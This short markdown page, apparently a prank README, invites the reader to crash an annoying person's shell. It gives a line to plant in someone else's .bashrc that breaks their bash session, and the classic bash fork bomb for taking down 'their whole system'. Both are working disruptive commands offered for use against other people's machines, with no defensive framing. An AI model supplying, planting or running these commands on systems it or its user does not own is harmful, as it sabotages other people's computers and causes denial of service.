# Crash your shell

Is someone annoying you? Crash their shell with just a few lines of code.

## Bash
Just add this to their [`.bashrc`] [1]:
```bash
eval "$BASH_COMMAND"
```
Or even their whole system:
```bash
:(){ :|:& };:
```

---
### Notes
1. See https://github.com/dylanaraps/blag/blob/master/src/future/breaking-bash.md
